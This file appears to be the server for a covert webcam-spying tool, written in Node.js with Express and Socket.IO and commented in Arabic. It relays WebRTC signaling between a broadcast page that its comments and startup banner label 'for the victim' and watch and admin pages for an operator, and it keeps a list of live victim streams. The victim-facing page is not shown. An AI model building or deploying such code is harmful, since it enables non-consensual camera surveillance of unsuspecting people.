const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// تخزين البثوث النشطة
const activeStreams = new Map();

app.use(express.static(path.join(__dirname, 'public')));

// صفحة البث للضحية
app.get('/stream', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'broadcast.html'));
});

// صفحة المشاهدة للمشرف
app.get('/watch', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'watch.html'));
});

// صفحة التحكم
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

io.on('connection', (socket) => {
    console.log('⚡ عميل متصل:', socket.id);

    // بدء بث جديد (من الضحية)
    socket.on('start-broadcast', (data) => {
        const streamId = socket.id;
        activeStreams.set(streamId, {
            socketId: socket.id,
            viewerCount: 0,
            startTime: Date.now(),
            info: data
        });
        
        socket.join('broadcaster');
        console.log('📹 بدأ بث جديد:', data?.username || 'مجهول');
        
        // إعلام جميع المشرفين
        io.emit('stream-list', Array.from(activeStreams.values()));
    });

    // نقل إشارة WebRTC (Offer/Answer)
    socket.on('offer', (data) => {
        socket.to(data.target).emit('offer', {
            sdp: data.sdp,
            from: socket.id
        });
    });

    socket.on('answer', (data) => {
        socket.to(data.target).emit('answer', {
            sdp: data.sdp,
            from: socket.id
        });
    });

    socket.on('ice-candidate', (data) => {
        socket.to(data.target).emit('ice-candidate', {
            candidate: data.candidate,
            from: socket.id
        });
    });

    // مشاهدة بث (من المشرف)
    socket.on('watch-stream', (streamerId) => {
        socket.join('viewer');
        socket.streamerId = streamerId;
        
        const stream = activeStreams.get(streamerId);
        if (stream) {
            stream.viewerCount++;
            activeStreams.set(streamerId, stream);
            io.emit('stream-list', Array.from(activeStreams.values()));
        }
        
        console.log(`👁️ مشاهد يتصل بالبث ${streamerId} - المشاهدون: ${stream?.viewerCount}`);
    });

    // قطع الاتصال
    socket.on('disconnect', () => {
        // إذا كان هذا عميل بث
        if (activeStreams.has(socket.id)) {
            const stream = activeStreams.get(socket.id);
            console.log(`🔴 انتهى البث: ${socket.id} - كان لديه ${stream.viewerCount} مشاهد`);
            activeStreams.delete(socket.id);
            io.emit('stream-list', Array.from(activeStreams.values()));
            io.emit('stream-ended', socket.id);
        }
        
        console.log('🔌 عميل disconnected:', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔══════════════════════════════════════╗
    ║   🎥 سيرفر البث المباشر يعمل 🎥      ║
    ╠══════════════════════════════════════╣
    ║   رابط البث (للضحية):                ║
    ║   http://localhost:${PORT}/stream    ║
    ╠══════════════════════════════════════╣
    ║   رابط المشاهدة (للمشرف):            ║
    ║   http://localhost:${PORT}/watch      ║
    ╠══════════════════════════════════════╣
    ║   رابط التحكم:                       ║
    ║   http://localhost:${PORT}/admin      ║
    ╚══════════════════════════════════════╝
    `);
});
